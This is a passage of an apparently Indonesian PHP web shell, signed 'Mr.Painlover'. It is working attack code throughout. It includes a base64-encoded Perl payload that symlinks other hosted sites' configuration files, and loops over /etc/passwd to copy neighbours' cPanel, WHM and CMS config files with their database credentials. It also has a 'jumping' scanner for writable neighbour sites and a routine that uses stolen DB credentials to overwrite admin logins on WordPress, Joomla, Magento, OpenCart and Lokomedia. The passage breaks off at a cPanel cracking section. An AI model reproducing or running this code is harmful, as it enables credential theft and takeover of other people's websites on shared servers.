LiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
            $file = "pain_config/vhost.cin";
            $handle = fopen($file ,"w+");
            fwrite($handle ,base64_decode($vhost));
            fclose($handle);
            chmod($file, 0755);
            if(exe("cd pain_config && ./vhost.cin")) {
                echo "<center><a href='$link_config/pain_config'><font color=lime>Done</font></a></center>";
            } else {
                echo "<center><a href='$link_config/pain_config/vhost.cin'><font color=lime>Done</font></a></center>";
            }
     
        } else {
            $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
            while($passwd = fgets($etc)) {
                if($passwd == "" || !$etc) {
                    echo "<font color=red>Can't read /etc/passwd</font>";
                } else {
                    preg_match_all('/(.*?):x:/', $passwd, $user_config);
                    foreach($user_config[1] as $user_idx) {
                        $user_config_dir = "/home/$user_idx/public_html/";
                        if(is_readable($user_config_dir)) {
                            $grab_config = array(
                                "/home/$user_idx/.my.cnf" => "cpanel",
                                "/home/$user_idx/.accesshash" => "WHM-accesshash",
                                "$user_config_dir/po-content/config.php" => "Popoji",
                                "$user_config_dir/vdo_config.php" => "Voodoo",
                                "$user_config_dir/bw-configs/config.ini" => "BosWeb",
                                "$user_config_dir/config/koneksi.php" => "Lokomedia",
                                "$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
                                "$user_config_dir/clientarea/configuration.php" => "WHMCS",
                                "$user_config_dir/whm/configuration.php" => "WHMCS",
                                "$user_config_dir/whmcs/configuration.php" => "WHMCS",
                                "$user_config_dir/forum/config.php" => "phpBB",
                                "$user_config_dir/sites/default/settings.php" => "Drupal",
                                "$user_config_dir/config/settings.inc.php" => "PrestaShop",
                                "$user_config_dir/app/etc/local.xml" => "Magento",
                                "$user_config_dir/joomla/configuration.php" => "Joomla",
                                "$user_config_dir/configuration.php" => "Joomla",
                                "$user_config_dir/wp/wp-config.php" => "WordPress",
                                "$user_config_dir/wordpress/wp-config.php" => "WordPress",
                                "$user_config_dir/wp-config.php" => "WordPress",
                                "$user_config_dir/admin/config.php" => "OpenCart",
                                "$user_config_dir/slconfig.php" => "Sitelok",
                                "$user_config_dir/application/config/database.php" => "Ellislab");
                            foreach($grab_config as $config => $nama_config) {
                                $ambil_config = file_get_contents($config);
                                if($ambil_config == '') {
                                } else {
                                    $file_config = fopen("pain_config/$user_idx-$nama_config.txt","w");
                                    fputs($file_config,$ambil_config);
                                }
                            }
                        }      
                    }
                }  
            }
        echo "<center><a href='?dir=$dir/pain_config'><font color=lime>Done</font></a></center>";
        }
    } elseif($_GET['do'] == 'jumping') {
        $i = 0;
        echo "<div class='margin: 5px auto;'>";
        if(preg_match("/hsphere/", $dir)) {
            $urls = explode("\r\n", $_POST['url']);
            if(isset($_POST['jump'])) {
                echo "<pre>";
                foreach($urls as $url) {
                    $url = str_replace(array("http://","www."), "", strtolower($url));
                    $etc = "/etc/passwd";
                    $f = fopen($etc,"r");
                    while($gets = fgets($f)) {
                        $pecah = explode(":", $gets);
                        $user = $pecah[0];
                        $dir_user = "/hsphere/local/home/$user";
                        if(is_dir($dir_user) === true) {
                            $url_user = $dir_user."/".$url;
                            if(is_readable($url_user)) {
                                $i++;
                                $jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
                                if(is_writable($url_user)) {
                                    $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
                                }
                                echo $jrw."<br>";
                            }
                        }
                    }
                }
            if($i == 0) {
            } else {
                echo "<br>Total ada ".$i." Kamar di ".$ip;
            }
            echo "</pre>";
            } else {
                echo '<center>
                      <form method="post">
                      List Domains: <br>
                      <textarea name="url" style="width: 500px; height: 250px;">';
                $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
                while($getss = fgets($fp)) {
                    echo $getss;
                }
                echo  '</textarea><br>
                      <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                      </form></center>';
            }
        } elseif(preg_match("/vhosts|vhost/", $dir)) {
            preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
            $urls = explode("\r\n", $_POST['url']);
            if(isset($_POST['jump'])) {
                echo "<pre>";
                foreach($urls as $url) {
                    $url = str_replace("www.", "", $url);
                    $web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
                    if(is_dir($web_vh) === true) {
                        if(is_readable($web_vh)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                            if(is_writable($web_vh)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            if($i == 0) {
            } else {
                echo "<br>Total ada ".$i." Kamar di ".$ip;
            }
            echo "</pre>";
            } else {
                echo '<center>
                      <form method="post">
                      List Domains: <br>
                      <textarea name="url" style="width: 500px; height: 250px;">';
                      bing("ip:$ip");
                echo  '</textarea><br>
                      <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                      </form></center>';
            }
        } else {
            echo "<pre>";
            $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
            while($passwd = fgets($etc)) {
                if($passwd == '' || !$etc) {
                    echo "<font color=red>Can't read /etc/passwd</font>";
                } else {
                    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                    foreach($user_jumping[1] as $user_pain_jump) {
                        $user_jumping_dir = "/home/$user_pain_jump/public_html";
                        if(is_readable($user_jumping_dir)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                            if(is_writable($user_jumping_dir)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                            }
                            echo $jrw;
                            if(function_exists('posix_getpwuid')) {
                                $domain_jump = file_get_contents("/etc/named.conf");   
                                if($domain_jump == '') {
                                    echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                    foreach($domains_jump[1] as $dj) {
                                        $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_jumping_url = $user_jumping_url['name'];
                                        if($user_jumping_url == $user_pain_jump) {
                                            echo " => ( <u>$dj</u> )<br>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                echo "<br>";
                            }
                        }
                    }
                }
            }
            if($i == 0) {
            } else {
                echo "<br>Total ada ".$i." Kamar di ".$ip;
            }
            echo "</pre>";
        }
        echo "</div>";
    } elseif($_GET['do'] == 'auto_edit_user') {
        if($_POST['hajar']) {
            if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
                echo "username atau password harus lebih dari 6 karakter";
            } else {
                $user_baru = $_POST['user_baru'];
                $pass_baru = md5($_POST['pass_baru']);
                $conf = $_POST['config_dir'];
                $scan_conf = scandir($conf);
                foreach($scan_conf as $file_conf) {
                    if(!is_file("$conf/$file_conf")) continue;
                    $config = file_get_contents("$conf/$file_conf");
                    if(preg_match("/JConfig|joomla/",$config)) {
                        $dbhost = ambilkata($config,"host = '","'");
                        $dbuser = ambilkata($config,"user = '","'");
                        $dbpass = ambilkata($config,"password = '","'");
                        $dbname = ambilkata($config,"db = '","'");
                        $dbprefix = ambilkata($config,"dbprefix = '","'");
                        $prefix = $dbprefix."users";
                        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result['id'];
                        $site = ambilkata($config,"sitename = '","'");
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                        echo "Config => ".$file_conf."<br>";
                        echo "CMS => Joomla<br>";
                        if($site == '') {
                            echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                        } else {
                            echo "Sitename => $site<br>";
                        }
                        if(!$update OR !$conn OR !$db) {
                            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                        } else {
                            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif(preg_match("/WordPress/",$config)) {
                        $dbhost = ambilkata($config,"DB_HOST', '","'");
                        $dbuser = ambilkata($config,"DB_USER', '","'");
                        $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                        $dbname = ambilkata($config,"DB_NAME', '","'");
                        $dbprefix = ambilkata($config,"table_prefix  = '","'");
                        $prefix = $dbprefix."users";
                        $option = $dbprefix."options";
                        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result[ID];
                        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                        $result2 = mysql_fetch_array($q2);
                        $target = $result2[option_value];
                        if($target == '') {
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                        }
                        $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                        echo "Config => ".$file_conf."<br>";
                        echo "CMS => Wordpress<br>";
                        echo $url_target;
                        if(!$update OR !$conn OR !$db) {
                            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                        } else {
                            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                        $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                        $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                        $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                        $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                        $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                        $prefix = $dbprefix."admin_user";
                        $option = $dbprefix."core_config_data";
                        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result[user_id];
                        $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                        $result2 = mysql_fetch_array($q2);
                        $target = $result2[value];
                        if($target == '') {
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                        }
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                        echo "Config => ".$file_conf."<br>";
                        echo "CMS => Magento<br>";
                        echo $url_target;
                        if(!$update OR !$conn OR !$db) {
                            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                        } else {
                            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                        $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                        $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                        $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                        $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                        $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                        $prefix = $dbprefix."user";
                        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                        $result = mysql_fetch_array($q);
                        $id = $result[user_id];
                        $target = ambilkata($config,"HTTP_SERVER', '","'");
                        if($target == '') {
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                        }
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                        echo "Config => ".$file_conf."<br>";
                        echo "CMS => OpenCart<br>";
                        echo $url_target;
                        if(!$update OR !$conn OR !$db) {
                            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                        } else {
                            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                        $dbhost = ambilkata($config,'server = "','"');
                        $dbuser = ambilkata($config,'username = "','"');
                        $dbpass = ambilkata($config,'password = "','"');
                        $dbname = ambilkata($config,'database = "','"');
                        $prefix = "users";
                        $option = "identitas";
                        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                        $db = mysql_select_db($dbname);
                        $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                        $result = mysql_fetch_array($q);
                        $target = $result[alamat_website];
                        if($target == '') {
                            $target2 = $result[url];
                            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                            if($target2 == '') {
                                $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                            } else {
                                $cek_login3 = file_get_contents("$target2/adminweb/");
                                $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                                if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                    $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                                } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                    $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                                } else {
                                    $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                                }
                            }
                        } else {
                            $cek_login = file_get_contents("$target/adminweb/");
                            $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                                $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                                $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                        $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                        echo "Config => ".$file_conf."<br>";
                        echo "CMS => Lokomedia<br>";
                        if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                            echo $url_target2;
                        } else {
                            echo $url_target;
                        }
                        if(!$update OR !$conn OR !$db) {
                            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                        } else {
                            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        }
                        mysql_close($conn);
                    }
                }
            }
        } else {
            echo "<center>
            <h1>Auto Edit User Config</h1>
            <form method='post'>
            DIR Config: <br>
            <input type='text' size='50' name='config_dir' value='$dir'><br><br>
            Set User & Pass: <br>
            <input type='text' name='user_baru' value='Mr.Painlover' placeholder='user_baru'><br>
            <input type='text' name='pass_baru' value='Mr.Painlover' placeholder='pass_baru'><br>
            <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
            </form>
            <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
            ";
        }
    } elseif($_GET['do'] == 'cpanel') {
        if($_POST['crack']) {
            $usercp = explode("\r\n", $_POST['user_cp']);
